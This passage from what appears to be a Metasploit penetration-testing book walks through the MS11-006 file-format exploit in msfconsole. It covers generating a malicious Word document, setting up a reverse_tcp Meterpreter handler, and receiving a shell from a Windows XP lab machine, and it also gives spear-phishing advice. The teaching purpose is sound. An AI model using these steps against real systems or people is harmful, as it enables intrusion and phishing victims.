msf exploit(ms11_006_createsizeddibsection) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Creating 'msf.doc' file...<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
[*] Generated output file /opt/metasploit3/msf3/data/exploits/msf.doc<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
msf exploit(ms11_006_createsizeddibsection) &gt;</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="sending_the_payload">Sending the Payload</h2></div></div></div><p class="calibre2">Our file was exported as <span class="strong"><em class="calibre4">msf.doc</em></span> <span class="inlinemediaobject"><a id="I_inlinemediaobject8_d1e10547" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and sent to the <span class="strong"><em class="calibre4">/opt/</em></span> <span class="inlinemediaobject"><a id="I_inlinemediaobject8_d1e10556" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> directory within Metasploit. Now that we have our malicious document, we can craft up an email to our target and hope the user opens it. At this point, we should already have an idea of the target’s patch levels and vulnerabilities. Before we actually open the document, we need to set up a multi-handler listener. This will ensure that when the exploit is triggered, the attacker machine can receive the connection back from the target machine (reverse payload).<a id="IDX-CHP-8-0062" class="strong"/></p><a id="I_programlisting8_d1e10565" class="strong"/><pre class="programlisting">msf exploit(ms11_006_createsizeddibsection) &gt; <strong class="calibre3"><code class="calibre6">use multi/handler</code></strong>
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/meterpreter/reverse_tcp</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 172.16.32.128</code></strong>
LHOST =&gt; 172.16.32.128
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 443</code></strong>
LPORT =&gt; 443
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">exploit -j</code></strong>
[*] Exploit running as background job.
[*] Started reverse handler on 172.16.32.128:443
[*] Starting the payload handler...
msf exploit(handler) &gt;</pre><p class="calibre2">We open the document on a Windows XP virtual machine, and we should be presented with a shell (provided our VM is Windows XP SP3):</p><a id="I_programlisting8_d1e10584" class="strong"/><pre class="programlisting">msf exploit(handler) &gt;
[*] Sending stage (749056 bytes) to 172.16.32.131
[*] Meterpreter session 1 opened (172.16.32.128:443 -&gt; 172.16.32.131:2718) at
    Sun Apr 03 21:39:58 −0400 2011
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 1</code></strong>
[*] Starting interaction with 1...
meterpreter &gt;</pre><p class="calibre2">We have successfully exploited a file format vulnerability by creating a malicious document through Metasploit and then sending it to our targeted user. Looking back at this exploit, if we had performed proper reconnaissance on our target user, we could have crafted a pretty convincing email. This exploit is one example of a number of file format exploits available in Metasploit.<a id="IDX-CHP-8-0063" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up-id3">Wrapping Up</h2></div></div></div><p class="calibre2">We covered how client-side exploits generally work by manipulating the heap to work in the attacker’s favor. We covered how NOP instructions work within an attack and how to use the basics of a debugger. You’ll learn more about leveraging a debugger in <a class="xref" href="part0018.html#creating_your_own_exploits">Chapter 14</a> and <a class="xref" href="part0019.html#porting_exploits_to_the_metasploit_frame">Chapter 15</a>. MS11-006 was a stack-based overflow, which we will cover in depth in later chapters. Note that your success rate with these types of attacks resides in how much information you gain about the target before you attempt to perform the attacks.</p><p class="calibre2">As a penetration tester, every bit of information can be used to craft an even better attack. In the case of spear-phishing, if you can talk the language of the company and target your attacks against smaller business units within the company that probably aren’t technical in nature, your chances of success greatly increase. Browser exploits and file format exploits are typically very effective, granted you do your homework. We’ll cover this topic in more detail in <a class="xref" href="part0012.html#exploitation_using_client-side_attacks">Chapter 8</a> and <a class="xref" href="part0014.html#the_social-engineer_toolkit">Chapter 10</a>.</p></div></section></body></html>